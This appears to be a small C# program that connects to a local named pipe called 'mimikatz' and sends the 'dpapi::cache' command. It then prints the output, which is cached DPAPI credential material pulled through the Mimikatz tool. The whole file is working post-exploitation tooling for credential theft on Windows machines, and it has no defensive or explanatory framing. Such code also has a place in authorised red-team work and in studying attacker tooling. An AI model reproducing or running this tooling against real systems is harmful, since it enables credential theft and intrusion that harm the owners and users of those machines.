using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO.Pipes;
using System.Runtime.Serialization;
using System.IO;

namespace MimikatzInteraction
{
    class Program
    {
        static void Main(string[] args)
        {
            string command = "dpapi::cache";
            NamedPipeClientStream pipeClientStream = new NamedPipeClientStream("localhost", "mimikatz", PipeDirection.InOut, PipeOptions.Asynchronous);
            pipeClientStream.Connect(3000);
            StreamWriter writer = new StreamWriter(pipeClientStream);
            writer.Write(command);
            writer.Flush();
            using (StreamReader sr = new StreamReader(pipeClientStream))
            {
                var line = sr.ReadLine();
                while (line.ToUpper().Trim() != "EOF")
                {
                    Console.WriteLine(line);
                    line = sr.ReadLine();
                }
            }
            if (pipeClientStream.IsConnected)
            {
                writer.Close();
            }
        }
    }
}
